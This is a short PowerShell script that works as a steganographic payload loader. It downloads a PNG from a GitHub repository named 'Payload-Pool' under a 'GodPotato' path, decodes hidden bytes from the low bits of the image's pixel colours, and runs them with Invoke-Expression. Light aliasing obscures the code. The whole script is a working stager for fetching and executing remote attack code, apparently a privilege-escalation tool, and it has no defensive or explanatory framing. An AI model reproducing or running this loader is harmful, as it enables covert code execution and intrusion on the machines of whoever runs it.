$imageUrl = "https://raw.githubusercontent.com/papcaii/Payload-Pool/refs/heads/main/GodPotato/out.png"
$outputPath = "$env:userprofile\downloads\out.png" # Change this to your desired location

try {
    Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath
    Write-Host "Image downloaded successfully to: $outputPath" -ForegroundColor Green
} catch {
    Write-Host "Error downloading image: $($_.Exception.Message)" -ForegroundColor Red
}

sal a New-Object;Add-Type -A System.Drawing;
$g=a System.Drawing.Bitmap("$env:userprofile\downloads\out.png");
$o=a Byte[] 7001382;
(0..699)|%{
foreach($x in 0..699) {
$p=$g.GetPixel($x, $_);
$o[$_*700+$x]=[math]::Floor(($p.R -band 0x0F)*16) + ($p.G -band 0x0F);
}
};
$g.Dispose();
IEX([System.Text.Encoding]::ASCII.GetString($o[0..34495]))